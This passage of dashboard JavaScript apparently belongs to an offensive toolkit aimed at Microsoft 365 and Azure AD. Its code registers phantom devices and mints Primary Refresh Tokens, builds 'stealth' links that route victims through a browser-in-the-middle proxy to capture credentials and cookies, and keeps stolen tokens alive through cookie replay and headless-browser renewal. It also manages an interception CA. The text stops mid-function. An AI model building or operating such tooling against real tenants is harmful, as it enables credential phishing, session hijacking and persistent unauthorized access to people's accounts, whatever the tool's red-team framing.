  if(kind==='success'||/\[\+\]/.test(line))color='#86efac';
  else if(kind==='warn'||/\[!\]/.test(line))color='#fbbf24';
  else if(kind==='error'||/\[-\]/.test(line))color='#f87171';
  else if(/^\s*>>>/.test(line))color='#78859b';
  span.style.color=color;
  span.textContent=line;
  el.appendChild(span);
  // Trim DOM if it grows huge.
  while(el.childNodes.length>3000)el.removeChild(el.firstChild);
  el.scrollTop=el.scrollHeight;
}
function phantomStart(){
  if(phantomWs)return;  // already running from this tab
  const params={
    username:(document.getElementById('phantom-user').value||'').trim(),
    password:document.getElementById('phantom-pass').value||'',
    domain:(document.getElementById('phantom-domain').value||'').trim(),
    device_name:(document.getElementById('phantom-devname').value||'').trim(),
    device_type:document.getElementById('phantom-devtype').value||'Windows',
    os_version:(document.getElementById('phantom-osver').value||'').trim(),
    start_phase:parseInt(document.getElementById('phantom-start').value||'1',10)||1,
    stop_phase:parseInt(document.getElementById('phantom-stop').value||'0',10)||0,
    force:document.getElementById('phantom-force').checked,
    dry_run:document.getElementById('phantom-dry').checked,
    intune:document.getElementById('phantom-intune').checked,
    intune_host:(document.getElementById('phantom-intune-host').value||'').trim(),
    hybrid_domain:(document.getElementById('phantom-hybrid').value||'').trim(),
  };
  if(!params.username||!params.password||!params.domain){
    alert('Username, Password, Domain are required.');return;
  }
  if(!params.dry_run){
    const proceed=confirm(
      'This will MUTATE Azure AD tenant state for '+params.domain+
      '\n  • Register a phantom device under '+params.username+
      '\n  • Mint a Primary Refresh Token'+
      (params.intune?'\n  • Enroll the phantom device in Intune':'')+
      '\n\nProceed only on an authorized engagement.\n\nContinue?'
    );
    if(!proceed)return;
  }
  phantomLogLines=[];
  document.getElementById('phantom-log').innerHTML='';
  document.getElementById('phantom-findings').style.display='none';
  document.getElementById('phantom-findings').innerHTML='';
  document.getElementById('phantom-phase').textContent='—';
  document.getElementById('phantom-runinfo').textContent='';
  _phantomSetRunningUI(true);

  const ak=new URLSearchParams(location.search).get('api_key')||'';
  const proto=location.protocol==='https:'?'wss:':'ws:';
  const url=`${proto}//${location.host}/api/phantom/run${ak?('?api_key='+encodeURIComponent(ak)):''}`;
  const ws=new WebSocket(url);
  phantomWs=ws;
  ws.onopen=()=>{
    ws.send(JSON.stringify({cmd:'start',params}));
    _phantomLog('[ws] connected — sent start','info');
  };
  ws.onmessage=(ev)=>{
    let m;try{m=JSON.parse(ev.data)}catch(_){return}
    if(m.type==='log'){_phantomLog(m.line||'')}
    else if(m.type==='phase'){
      document.getElementById('phantom-phase').textContent=`${m.num}: ${m.name}`;
    }
    else if(m.type==='started'){
      document.getElementById('phantom-runinfo').textContent=`pid=${m.pid} · ${m.work_dir}`;
      _phantomLog('[*] subprocess pid='+m.pid,'info');
    }
    else if(m.type==='busy'){alert('A Phantom run is already in progress.');phantomWs=null;_phantomSetRunningUI(false)}
    else if(m.type==='denied'){alert('Phantom Join is denied: '+(m.reason||''));phantomWs=null;_phantomSetRunningUI(false)}
    else if(m.type==='error'){_phantomLog('[ERROR] '+(m.message||''),'error')}
    else if(m.type==='stopped'){_phantomLog('[!] subprocess terminated by operator','warn')}
    else if(m.type==='done'){
      _phantomLog(`[*] exit_code=${m.exit_code} · findings=${(m.findings||[]).length}`,'info');
      _phantomRenderFindings(m.findings||[]);
      phantomWs=null;
      _phantomSetRunningUI(false);
    }
  };
  ws.onclose=()=>{
    if(phantomWs===ws){
      phantomWs=null;
      _phantomSetRunningUI(false);
    }
  };
  ws.onerror=()=>{_phantomLog('[ws] connection error','error')};
}
function phantomStop(){
  if(phantomWs){
    try{phantomWs.send(JSON.stringify({cmd:'stop'}))}catch(_){}
    return;
  }
  // No live WS in this tab — open a one-shot stop connection so the
  // operator can abort a run started elsewhere.
  const ak=new URLSearchParams(location.search).get('api_key')||'';
  const proto=location.protocol==='https:'?'wss:':'ws:';
  const url=`${proto}//${location.host}/api/phantom/run${ak?('?api_key='+encodeURIComponent(ak)):''}`;
  const ws=new WebSocket(url);
  ws.onopen=()=>ws.send(JSON.stringify({cmd:'stop'}));
  ws.onmessage=(ev)=>{
    let m;try{m=JSON.parse(ev.data)}catch(_){return}
    if(m.type==='stopped')_phantomLog('[!] stop signal accepted','warn');
    else if(m.type==='error')_phantomLog('[!] stop: '+(m.message||''),'error');
  };
  ws.onclose=()=>_phantomSetRunningUI(false);
}
function _phantomRenderFindings(findings){
  const el=document.getElementById('phantom-findings');
  if(!findings||!findings.length){
    el.style.display='none';return;
  }
  const sevColor={CRITICAL:'#f87171',HIGH:'#fb923c',MEDIUM:'#fbbf24',INFO:'#94a3b8'};
  const sevMark={CRITICAL:'🔴',HIGH:'🟠',MEDIUM:'🟡',INFO:'⚪'};
  const rows=findings.map(f=>{
    const c=sevColor[f.severity]||'#94a3b8';
    const m=sevMark[f.severity]||'⚪';
    return `<div style="border-left:3px solid ${c};padding:6px 10px;margin-bottom:6px;background:#0a0e15">
      <div style="display:flex;align-items:center;gap:8px;font-size:13px">
        <span>${m}</span>
        <span style="color:${c};font-weight:600">${esc(f.severity||'')}</span>
        <span style="color:#cbd5e1">${esc(f.title||'')}</span>
        <span style="color:#78859b;font-size:11px;margin-left:auto">phase ${esc(String(f.phase||'?'))}${f.mitre?' · '+esc(f.mitre):''}</span>
      </div>
      <div style="color:#94a3b8;font-size:12px;margin-top:4px;line-height:1.5">${esc(f.detail||'')}</div>
    </div>`;
  }).join('');
  el.innerHTML=`<div style="font-size:13px;color:#cbd5e1;font-weight:600;margin-bottom:8px">Findings (${findings.length})</div>${rows}`;
  el.style.display='block';
}

function renderNoisyExts(){
  const el=document.getElementById('noisy-exts');if(!el)return;
  const exts=configCache.noisy_extensions||[];
  el.innerHTML=exts.map((ext,i)=>`<span style="display:inline-flex;align-items:center;gap:2px;background:#1a1a2e;border:1px solid #333;border-radius:4px;padding:1px 6px;font-size:13px;color:#94a3b8">${esc(ext)}<button style="background:none;border:none;color:#78859b;cursor:pointer;font-size:13px;padding:0 2px" onclick="removeNoisyExt(${i})">&times;</button></span>`).join('');
}
function addNoisyExt(){const inp=document.getElementById('add-ext-input'),v=inp.value.trim();if(!v)return;if(!configCache.noisy_extensions)configCache.noisy_extensions=[];configCache.noisy_extensions.push(v);send({cmd:'update_config',data:{noisy_extensions:configCache.noisy_extensions}});inp.value='';renderNoisyExts()}
function removeNoisyExt(i){if(!configCache.noisy_extensions)return;configCache.noisy_extensions.splice(i,1);send({cmd:'update_config',data:{noisy_extensions:configCache.noisy_extensions}});renderNoisyExts()}
function cfgSet(k,v){
  configCache[k]=v;
  // Push the single-key delta to the backend immediately, so follow-up
  // commands (Test Connection, Start Proxy, etc.) see the new value
  // without the user having to hit an Apply button.
  send({cmd:'update_config',data:{[k]:v}});
  // Re-render views whose summary depends on this key.
  if(k==='upstream_proxy'||k==='upstream_proxy_host'){
    try{renderUpstreamHost()}catch(_){}
  }
  if(k==='browser_chrome'||k==='browser_type'||k==='mobile_emulation'){
    // no-op here — these take effect on the next session launch
  }
  // The Get-AAATokenFromAzLogin snippet on every Captured Data card
  // embeds default_tenant_id directly, so a tenant change should
  // refresh that view without requiring a tab re-entry.
  if(k==='default_tenant_id'&&currentTab==='creds'){
    try{renderCreds()}catch(_){}
  }
}
// saveConfig still exists for the bulk-Apply buttons that remain in the
// Settings tab. After this change it's essentially a flush-everything.
function saveConfig(){send({cmd:'update_config',data:configCache})}
function clearAllSensitive(){if(!confirm('Delete ALL credentials, cookies, screenshots, and saved email?'))return;send({cmd:'clear_all_sensitive'})}
function launchBitmProxy(priv){const _ak=new URLSearchParams(location.search).get('api_key')||'';const q=(priv?'auto=1&private=1':'auto=1')+(_ak?'&api_key='+_ak:'');const mainUrl=location.protocol+'//'+location.hostname+':8091';window.open(mainUrl+'/'+('?'+q),'_blank','popup,width=500,height=960')}

// ── Generate capture link ──
function _buildCaptureLink(target){
  const ak=new URLSearchParams(location.search).get('api_key')||'';
  const base=location.protocol+'//'+location.hostname+':8091';
  const params=new URLSearchParams();
  params.set('url',target);
  params.set('auto','1');
  params.set('stealth','1');
  params.set('private','1');
  if(ak)params.set('api_key',ak);
  return base+'/?'+params.toString();
}
function generateCaptureLink(){
  let t=(document.getElementById('cap-link-target').value||'').trim();
  if(!t){document.getElementById('cap-link-note').textContent='Enter a target URL first.';return}
  if(!/^https?:\/\//i.test(t))t='https://'+t;
  const link=_buildCaptureLink(t);
  document.getElementById('cap-link-custom-output').style.display='flex';
  document.getElementById('cap-link-output').value=link;
  document.getElementById('cap-link-note').innerHTML=`Reachable on <b>${esc(location.hostname)}:8091</b>. If the subject is on a different host, replace <code>${esc(location.hostname)}</code> with your box's externally-reachable address.`;
}
function renderCaptureLinkList(){
  const el=document.getElementById('cap-link-list');if(!el)return;
  const urls=(configCache.login_urls||[]).slice();
  if(!urls.length){el.innerHTML='<div style="color:#78859b;font-size:13px">No login URLs configured yet. Add some in Settings → Login URLs.</div>';return}
  el.innerHTML=urls.map((u,i)=>{
    let host=u;try{host=new URL(u).hostname.replace(/^www\./,'')}catch(e){}
    const link=_buildCaptureLink(u);
    const lid=`cap-link-row-${i}`;
    return `<div style="display:flex;gap:8px;align-items:center;margin-bottom:6px;flex-wrap:wrap">
      <div style="min-width:170px;font-size:13px">
        <div style="color:#e2e8f0;font-weight:600">${esc(host)}</div>
        <div style="color:#78859b;font-size:12px;max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(u)}">${esc(u)}</div>
      </div>
      <input id="${lid}" class="cfg-input" style="flex:1;min-width:280px;font-family:'SF Mono',monospace;font-size:11px" type="text" readonly value="${esc(link)}">
      <button class="btn" style="padding:4px 10px;font-size:12px" onclick="copyCaptureLinkById('${lid}')">Copy</button>
      <button class="btn" style="padding:4px 10px;font-size:12px" onclick="window.open(document.getElementById('${lid}').value,'_blank','popup,width=1280,height=900')">Open</button>
    </div>`;
  }).join('');
}
function copyCaptureLinkById(id){
  const el=document.getElementById(id);if(!el||!el.value)return;
  navigator.clipboard.writeText(el.value).then(()=>{
    el.style.borderColor='#4ade80';setTimeout(()=>{el.style.borderColor=''},800);
  }).catch(()=>{
    el.select();document.execCommand('copy');
  });
}
function copyCaptureLink(){
  const el=document.getElementById('cap-link-output');
  if(!el.value){generateCaptureLink();if(!el.value)return}
  navigator.clipboard.writeText(el.value).then(()=>{
    document.getElementById('cap-link-note').textContent='Copied.';
  }).catch(()=>{
    el.select();document.execCommand('copy');
    document.getElementById('cap-link-note').textContent='Copied (fallback).';
  });
}
function openCaptureLink(){
  const el=document.getElementById('cap-link-output');
  if(!el.value){generateCaptureLink();if(!el.value)return}
  window.open(el.value,'_blank','popup,width=1280,height=900');
}

// ── Proxy Config (in Proxy tab) ──
function renderProxyConfig(){
  const el=document.getElementById('proxy-cfg');if(!el)return;el.innerHTML='';
  const keys=['upstream_proxy','upstream_proxy_host'];
  for(const k of keys){
    const v=configCache[k];if(v===undefined)continue;
    const row=document.createElement('div');row.className='config-row';const label=k.replace(/_/g,' ');
    if(typeof v==='boolean')row.innerHTML=`<label>${label}</label><label class="toggle"><input type="checkbox" ${v?'checked':''} onchange="cfgSet('${k}',this.checked)"><span class="sl"></span></label>`;
    else if(typeof v==='string')row.innerHTML=`<label>${label}</label><input class="cfg-input cfg-input-wide" type="text" value="${esc(v)}" onchange="cfgSet('${k}',this.value)">`;
    el.appendChild(row);
  }
  el.insertAdjacentHTML('beforeend',
    `<div style="color:#78859b;font-size:12px;margin-top:4px">Accepted schemes: <code>http://</code>, <code>https://</code>, <code>socks4://</code>, <code>socks4a://</code>, <code>socks5://</code>, <code>socks5h://</code>. Bare <code>host:port</code> defaults to HTTP. Chromium does NOT send credentials over SOCKS5 — put auth on an HTTP proxy instead.</div>`);
}

// ── Upstream Proxy Test ──
function renderUpstreamHost(){
  const el=document.getElementById('upstream-host-display');
  const h=configCache.upstream_proxy_host||'not configured';
  const on=configCache.upstream_proxy;
  el.innerHTML=`<span style="color:${on?'#4ade80':'#f87171'}">${on?'ON':'OFF'}</span> &rarr; <span style="color:#7dd3fc">${esc(h)}</span>`;
}
function testUpstreamProxy(){
  const el=document.getElementById('upstream-test-result');
  el.innerHTML='<span style="color:#94a3b8">Testing...</span>';
  send({cmd:'test_proxy_connection'});
}
function renderProxyTest(data){
  const el=document.getElementById('upstream-test-result');
  if(!data.steps){el.innerHTML=`<span style="color:#f87171">Error</span>`;return}
  let h=data.steps.map(s=>{
    const icon=s.ok?'<span style="color:#4ade80">&#10003;</span>':'<span style="color:#f87171">&#10007;</span>';
    return`<div style="margin:2px 0">${icon} <b>${esc(s.name)}</b> <span style="color:#8893a7">${esc(s.detail)}</span></div>`;
  }).join('');
  const overall=data.ok?'<span style="color:#4ade80;font-weight:bold">PASS</span>':'<span style="color:#f87171;font-weight:bold">FAIL</span>';
  el.innerHTML=`<div style="margin-bottom:4px">${overall} ${esc(data.host)}:${data.port}</div>${h}`;
}

// ── Test Proxy ──
let proxyStatus={running:false,request_count:0};
function renderProxy(){
  const badge=document.getElementById('proxy-badge'),info=document.getElementById('proxy-info');
  if(proxyStatus.running){badge.textContent='running';badge.className='badge badge-live';info.textContent=`Requests: ${proxyStatus.request_count||0}`}
  else{badge.textContent='stopped';badge.className='badge badge-dead';info.textContent=''}
}
function startProxy(){
  const port=Number(document.getElementById('proxy-port').value)||3129;
  const published=(port>=3100&&port<=3199);
  if(!published){
    if(!confirm(`Port ${port} is not published to your host (only 3100-3199 is). Proxy will bind inside the container only. Continue?`))return;
  }
  send({cmd:'start_test_proxy',port});
}
function stopProxy(){send({cmd:'stop_test_proxy'})}
function setDefaultUrl(u){configCache.default_login_url=u;send({cmd:'update_config',data:{default_login_url:u}});renderPresets()}

// ── Log File Info ──
let logFileInfo={};
function renderLogFileInfo(){
  const el=document.getElementById('log-file-info');if(!el)return;
  const on=configCache.log_to_file;
  if(!on){
    el.innerHTML=`<div style="color:#78859b">Disabled — toggle <b>log to file</b> in config above</div>`;
    return;
  }
  el.innerHTML=`<div style="margin-bottom:4px"><span style="color:#4ade80">&#9679;</span> Logging to file</div>
    <div style="word-break:break-all;color:#7dd3fc;font-size:13px">${esc(logFileInfo.path||'?')}</div>
    <div style="margin-top:4px;color:#94a3b8">${logFileInfo.file_count||0} files, ${logFileInfo.total_size_mb||0} MB total</div>
    <div style="color:#78859b">${logFileInfo.max_size_mb||25} MB/file, ${logFileInfo.max_files||30} files max</div>
    <button class="btn" style="margin-top:6px;padding:3px 10px;font-size:13px" onclick="send({cmd:'get_log_file_info'})">Refresh</button>`;
}

// ── Token Keep-Alive ──
let keepaliveStatus={running:false,last_run:0,last_results:{}};
// Keepalive config groups + per-key inline help. Order is the order
// rows render in the panel.
const _KEEPALIVE_GROUPS=[
  {title:'Cycle', keys:['keepalive_enabled','keepalive_interval_minutes']},
  {title:'Failure handling',
   keys:['keepalive_max_consecutive_failures','enable_token_testing']},
  {title:'Debug tracing', keys:['keepalive_trace_enabled']},
  {title:'SPA fallback (dedicated Playwright)',
   keys:['keepalive_playwright_fallback_enabled','keepalive_playwright_timeout_seconds']},
];
const _KEEPALIVE_NOTES={
  keepalive_enabled:
    'Background loop that validates every captured site every <code>keepalive_interval_minutes</code>. When off, no automatic checks run — captured tokens still sit in the credentials store and the operator-driven Test buttons still work.',
  keepalive_interval_minutes:
    'Cadence of the cycle. 5 m is the floor that catches most expiries before they bite. Lower = faster detection / more Graph traffic; higher = quieter logs / longer time-to-detect.',
  keepalive_max_consecutive_failures:
    'After this many consecutive failed cycles for a site, keepalive PAUSES it — stops hammering Graph + cookie-replay AND stops emitting recurring failure log lines / Slack alerts. Operator resumes via the Devices → Debug → Resume button.',
  enable_token_testing:
    'Master gate for the Graph <code>/me</code> probe AND the cookie-replay reauth. Turning this off makes keepalive purely local-JWT-decode based — no upstream HTTP, but no actual token-validity verification or auto-refresh either. Useful in airgapped labs or when you don\'t want sign-in log entries.',
  keepalive_trace_enabled:
    'When ON, the cycle emits 3-5 verbose <b>TRACE</b> lines per site per cycle on the <code>keepalive</code> log category — token claims, Graph round-trip timing, full cookie-replay round-trip with redirect chain and found-token result. Off keeps the log buffer focused on outcomes.',
  keepalive_playwright_fallback_enabled:
    'When the cookie-replay GET returns an SPA HTML shell with no token (the <code>myapps.microsoft.com</code> / <code>portal.azure.com</code> / Office.com pattern), fall back to a <b>dedicated long-lived headless Chromium</b> that runs the SPA, waits for MSAL\'s silent-renewal flow, and captures the <code>/oauth2/v2.0/token</code> response. Browser is launched once, kept warm, refreshes share it via per-refresh contexts.',
  keepalive_playwright_timeout_seconds:
    'Per-refresh timeout for the Playwright fallback. Page must land + MSAL must complete its silent-renewal POST within this window or the refresh is recorded as a timeout (and the consecutive-failure counter ticks). Default <b>12s</b> covers a slow first-load.',
};

function renderKeepalive(){
  const badge=document.getElementById('ka-badge'),info=document.getElementById('ka-info');
  if(!badge)return;
  if(keepaliveStatus.running){badge.textContent='running';badge.className='badge badge-live'}
  else{badge.textContent='stopped';badge.className='badge badge-dead'}
  let h='';
  const interval=keepaliveStatus.interval_minutes||configCache.keepalive_interval_minutes||5;
  h+=`<div style="color:#78859b;margin-bottom:4px">Interval: ${interval}m</div>`;
  if(keepaliveStatus.last_run){
    const ago=Math.round((Date.now()/1000-keepaliveStatus.last_run)/60);
    h+=`<div style="margin-bottom:6px">Last check: ${ago<1?'just now':ago+'m ago'}</div>`;
  }
  // Surface the dedicated Playwright fallback status — visible
  // confirmation that the warm browser is up + how many refreshes
  // it has driven.
  const pw=keepaliveStatus.pw_browser||{};
  if(keepaliveStatus.pw_fallback_enabled){
    if(pw.running){
      const up=Math.round((pw.uptime_seconds||0)/60);
      h+=`<div style="margin-bottom:6px;color:#86efac">PW fallback browser up ${up}m · ${pw.refresh_count||0} refresh${pw.refresh_count===1?'':'es'}</div>`;
    } else {
      h+=`<div style="margin-bottom:6px;color:#94a3b8">PW fallback enabled — browser launches lazily on first SPA refresh.</div>`;
    }
  }
  const res=keepaliveStatus.last_results||{};
  const keys=Object.keys(res);
  if(keys.length){
    h+=keys.map(sid=>{
      const r=res[sid];
      const host=r.hostname||sid.replace(/_/g,'.');
      if(r.valid===null)return`<div style="color:#78859b">${esc(host)}: no token</div>`;
      const icon=r.valid?'<span style="color:#4ade80">&#10003;</span>':'<span style="color:#f87171">&#10007;</span>';
      let extra='';
      if(r.reauth_attempted)extra=r.reauth_success?' (re-authed)':' (re-auth failed)';
      if(r.user)extra+=` ${esc(r.user)}`;
      return`<div>${icon} <b>${esc(host)}</b> ${r.status_code||''}${extra}</div>`;
    }).join('');
  }
  // Token Lifetime Overview — per-site cards aggregating the
  // rolling history into "current exp_in / typical lifetime / last
  // refresh / refresh cadence". Answers "how long are these tokens
  // good for overall" without making the operator click Debug on
  // each row.
  const lifetimes=keepaliveStatus.lifetimes||{};
  const hostnames=keepaliveStatus.hostnames||{};
  const lifetimeIds=Object.keys(lifetimes);
  if(lifetimeIds.length){
    h+=`<h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:14px 0 6px">Token lifetime overview</h3>`;
    h+=lifetimeIds.map(sid=>{
      const lf=lifetimes[sid]||{};
      const host=hostnames[sid]||sid.replace(/_/g,'.');
      return _kaLifetimeCardHtml(sid, host, lf);
    }).join('');
  }

  h+=`<button class="btn" style="margin-top:8px;padding:3px 10px;font-size:13px" onclick="send({cmd:'get_keepalive_status'})">Refresh</button>`;
  info.innerHTML=h;
  // Render the grouped config knobs into #ka-config.
  const cfgEl=document.getElementById('ka-config');
  if(cfgEl){
    let chtml='';
    for(const g of _KEEPALIVE_GROUPS){
      chtml+=`<h3 style="font-size:13px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;margin:14px 0 6px">${esc(g.title)}</h3>`;
      for(const k of g.keys){
        if(!(k in configCache))continue;
        chtml+=_cfgRowHtml(k,configCache[k]);
        const note=_KEEPALIVE_NOTES[k];
        if(note)chtml+=`<div style="color:#78859b;font-size:12px;margin:-4px 0 8px 8px">${note}</div>`;
      }
    }
    cfgEl.innerHTML=chtml;
  }
}
function _fmtSecs(s){
  if(s==null||isNaN(s))return '—';
  s=Math.floor(Number(s));
  const sign=s<0?'-':'';
  s=Math.abs(s);
  if(s<60)return sign+s+'s';
  if(s<3600){const m=Math.floor(s/60),r=s%60;return sign+m+'m'+(r?' '+r+'s':'')}
  if(s<86400){const h=Math.floor(s/3600),m=Math.floor((s%3600)/60);return sign+h+'h'+(m?' '+m+'m':'')}
  const d=Math.floor(s/86400),h=Math.floor((s%86400)/3600);
  return sign+d+'d'+(h?' '+h+'h':'');
}
function _fmtAgo(ts){
  if(!ts)return 'never';
  const ago=Math.max(0,Math.floor(Date.now()/1000-ts));
  return _fmtSecs(ago)+' ago';
}
function _kaLifetimeCardHtml(sid, host, lf){
  const exp=lf.current_expires_in;
  const typ=lf.typical_lifetime_secs||0;
  // Bar shows how much of the typical token lifetime is left.
  // typ acts as the denominator only when we've observed a real
  // lifetime; otherwise we just label the absolute time remaining.
  let barHtml='';
  let barColor='#4ade80', barLabel='';
  if(exp!=null && typ>0){
    const pct=Math.max(0,Math.min(100,Math.round((exp/typ)*100)));
    barColor=pct>33?'#4ade80':(pct>10?'#fbbf24':'#f87171');
    if(exp<=0){barColor='#ef4444';barLabel='EXPIRED'}
    else barLabel=`${pct}% of ~${_fmtSecs(typ)}`;
    barHtml=`<div style="height:6px;background:#1e293b;border-radius:3px;overflow:hidden;margin:4px 0">
      <div style="height:100%;width:${exp<=0?100:pct}%;background:${barColor};transition:width 0.4s"></div>
    </div>`;
  } else if(exp!=null){
    if(exp<=0){barColor='#ef4444';barLabel='EXPIRED — typical lifetime not yet observed'}
    else{barLabel=`exp_in=${_fmtSecs(exp)} (typical lifetime not yet observed — need 1+ refresh to learn)`}
  }
  const lastRefresh=lf.last_refresh_ts
    ? `last refresh ${_fmtAgo(lf.last_refresh_ts)}`
    : (lf.refresh_count?'':'no refreshes observed yet');
  const cadence=lf.avg_refresh_interval_secs
    ? `~every ${_fmtSecs(lf.avg_refresh_interval_secs)}`
    : '';
  const validIcon=lf.current_valid===true?'<span style="color:#4ade80">●</span>'
                  :lf.current_valid===false?'<span style="color:#f87171">●</span>'
                  :'<span style="color:#94a3b8">●</span>';
  return `<div style="background:#0a0a18;border:1px solid #1e293b;border-radius:4px;padding:10px 12px;margin-bottom:8px;font-size:13px">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
      ${validIcon}
      <b style="color:#7dd3fc">${esc(host)}</b>
      <span style="color:#64748b;font-size:11px">${esc(sid.slice(-10))}</span>
      <span style="flex:1"></span>
      <button class="btn" style="padding:1px 8px;font-size:11px" onclick="kaDiagnose('${esc(sid)}')">Debug</button>
    </div>
    ${barHtml}
    <div style="display:flex;flex-wrap:wrap;gap:14px;color:#94a3b8;font-size:12px">
      <span>now: <b style="color:${barColor}">${exp==null?'—':(exp<=0?'EXPIRED':_fmtSecs(exp)+' left')}</b></span>
      <span>typical: <b style="color:#cbd5e1">${typ?_fmtSecs(typ):'—'}</b></span>
      <span>refreshes seen: <b style="color:#cbd5e1">${lf.refresh_count||0}</b></span>
      ${cadence?`<span>cadence: <b style="color:#cbd5e1">${esc(cadence)}</b></span>`:''}
      ${lastRefresh?`<span>${esc(lastRefresh)}</span>`:''}
      <span>${esc(String(lf.snapshot_count||0))} snapshots</span>
    </div>
    ${lf.aud?`<div style="color:#64748b;font-size:11px;margin-top:2px;font-family:monospace">aud=${esc(String(lf.aud).slice(0,80))}${lf.tid?` · tid=${esc(String(lf.tid))}`:''}</div>`:''}
  </div>`;
}
// Auth-proxy CA management.
async function refreshCaInfo(){
  const el=document.getElementById('ca-current');
  if(!el)return;
  el.innerHTML='<span style="color:#94a3b8">Loading…</span>';
  try{
    const r=await apiFetch('/api/browser/auth_proxy/ca');
    const info=await r.json();
    if(!info.loaded){
      el.innerHTML='<span style="color:#fbbf24">No CA loaded yet — start the auth proxy to auto-generate one, or upload a custom one below.</span>';
      return;
    }
    const validity=info.not_before&&info.not_after
      ? `${esc(info.not_before)} → ${esc(info.not_after)}` : '?';
    const fp=info.sha256?info.sha256.match(/.{1,2}/g).join(':').toUpperCase():'';
    el.innerHTML=`<div style="background:#05050e;border:1px solid #1f2937;border-radius:3px;padding:8px 10px;color:#cbd5e1">
      <div><b style="color:#7dd3fc">Subject:</b> ${esc(info.subject||'?')}</div>
      <div><b style="color:#7dd3fc">Issuer:</b> ${esc(info.issuer||'?')}${info.self_signed?' <span style="color:#86efac">(self-signed)</span>':''}</div>
      <div><b style="color:#7dd3fc">Validity:</b> ${validity}</div>
      <div><b style="color:#7dd3fc">Serial:</b> ${esc(info.serial||'?')}</div>
      ${fp?`<div style="font-family:monospace;font-size:11px;word-break:break-all"><b style="color:#7dd3fc">SHA-256:</b> ${esc(fp)}</div>`:''}
      ${info.cert_path?`<div style="color:#64748b;font-size:11px;margin-top:2px">on-disk: <code>${esc(info.cert_path)}</code></div>`:''}
    </div>`;
  }catch(e){
    el.innerHTML=`<span style="color:#f87171">Failed to load: ${esc(String(e))}</span>`;
  }
}
async function uploadCa(){
  const cert=document.getElementById('ca-cert-file').files[0];
  const key=document.getElementById('ca-key-file').files[0];
  const result=document.getElementById('ca-result');
  if(!cert||!key){result.innerHTML='<span style="color:#fbbf24">Pick both a cert and a key file.</span>';return}
  if(!confirm('Replace the active CA with the uploaded pair?\n\nEvery subject device that previously trusted the OLD CA will need to re-trust the NEW one. This action persists to $DATA_DIR/proxy_ca/{ca.crt, ca.key} and hot-swaps the in-memory cert.'))return;
  result.innerHTML='<span style="color:#94a3b8">Validating + persisting…</span>';
  const fd=new FormData();
  fd.append('cert',cert); fd.append('key',key);
  try{
    const r=await fetch('/api/browser/auth_proxy/ca',{
      method:'POST', body:fd,
      headers:_apiKey?{Authorization:'Bearer '+_apiKey}:undefined,
    });
    const data=await r.json();
    if(!r.ok){
      result.innerHTML=`<div style="color:#fecaca;background:#7f1d1d;border-left:3px solid #ef4444;padding:6px 10px;border-radius:0 3px 3px 0">
        <b>Upload rejected:</b> ${esc(data.detail||data.error||'unknown')}
      </div>`;
      return;
    }
    const warn=(data.warnings&&data.warnings.length)
      ? data.warnings.map(w=>`<div style="color:#fef08a">⚠ ${esc(w)}</div>`).join('')
      : '';
    result.innerHTML=`<div style="color:#a7f3d0;background:#064e3b;border-left:3px solid #10b981;padding:6px 10px;border-radius:0 3px 3px 0">
      <b>✓ CA replaced.</b> Subsequent connections will be BITM'd by the new pair. Existing host-leaf cert cache cleared.
      ${warn}
    </div>`;
    refreshCaInfo();
    document.getElementById('ca-cert-file').value='';
    document.getElementById('ca-key-file').value='';
  }catch(e){
    result.innerHTML=`<span style="color:#f87171">Network / upload error: ${esc(String(e))}</span>`;
  }
}
function downloadCa(){
  const url='/api/browser/auth_proxy/ca/download'+(_apiKey?('?api_key='+encodeURIComponent(_apiKey)):'');
  const a=document.createElement('a');
  a.href=url; a.download='bitm-proxy-ca.crt';
  document.body.appendChild(a); a.click(); a.remove();
}
async function resetCa(){
  if(!confirm('Wipe the persisted CA cert + key?\n\nA fresh self-signed pair will be generated on the next auth-proxy start. Every subject device must re-trust the NEW cert.'))return;
  const result=document.getElementById('ca-result');
  result.innerHTML='<span style="color:#94a3b8">Removing…</span>';
  try{
    const r=await apiFetch('/api/browser/auth_proxy/ca',{method:'DELETE'});
    const data=await r.json();
    if(data.ok){
      result.innerHTML=`<div style="color:#fef08a;background:#1e1b00;border-left:3px solid #fbbf24;padding:6px 10px;border-radius:0 3px 3px 0">
        ✓ CA removed (${esc((data.removed||[]).join(', ')||'nothing')}). Restart the auth proxy to regenerate.
      </div>`;
    } else {
      result.innerHTML=`<span style="color:#f87171">Reset failed: ${esc(data.error||'unknown')}</span>`;
    }
    refreshCaInfo();
  }catch(e){
    result.innerHTML=`<span style="color:#f87171">Reset error: ${esc(String(e))}</span>`;
  }
}

function startKeepalive(){send({cmd:'start_keepalive'})}
function stopKeepalive(){send({cmd:'stop_keepalive'})}

let keepaliveLogEntries=[];
function renderKeepaliveLog(){
  const el=document.getElementById('keepalive-log-list');if(!el)return;
  if(!keepaliveLogEntries.length){el.innerHTML='<div style="color:#78859b">No keep-alive checks yet. Enable and start keep-alive in the sidebar.</div>';return}
  el.innerHTML=keepaliveLogEntries.slice().reverse().map(e=>{
    const t=e.time||'';
    const ev=e.event||'?';
    const dbg=e.site_id?`<button class="btn" style="margin-left:6px;padding:1px 8px;font-size:11px;background:#0c4a6e;color:#7dd3fc" onclick="kaDiagnose('${esc(e.site_id)}')">Debug</button>`:'';
    if(ev==='check'){
      const icon=e.status==='valid'?'<span style="color:#4ade80">&#10003;</span>':'<span style="color:#f87171">&#10007;</span>';
      const user=e.user?` &mdash; ${esc(e.user)}`:'';
      return`<div style="padding:4px 0;border-bottom:1px solid #1a1a2e">${icon} <span style="color:#78859b">${t}</span> <b style="color:#7dd3fc">${esc(e.site||'?')}</b> <span style="color:${e.status==='valid'?'#4ade80':'#f87171'}">${e.status.toUpperCase()}</span> HTTP ${e.http||'?'}${user} <span style="color:#78859b;font-size:13px">(${esc(e.source||'')})</span>${dbg}</div>`;
    }else if(ev==='reauth'){
      const icon=e.status==='success'?'<span style="color:#fbbf24">&#8635;</span>':'<span style="color:#f87171">&#8635;</span>';
      return`<div style="padding:4px 0;border-bottom:1px solid #1a1a2e">${icon} <span style="color:#78859b">${t}</span> <b style="color:#7dd3fc">${esc(e.site||'?')}</b> Re-auth <span style="color:${e.status==='success'?'#4ade80':'#f87171'}">${e.status.toUpperCase()}</span></div>`;
    }else if(ev==='cycle_complete'){
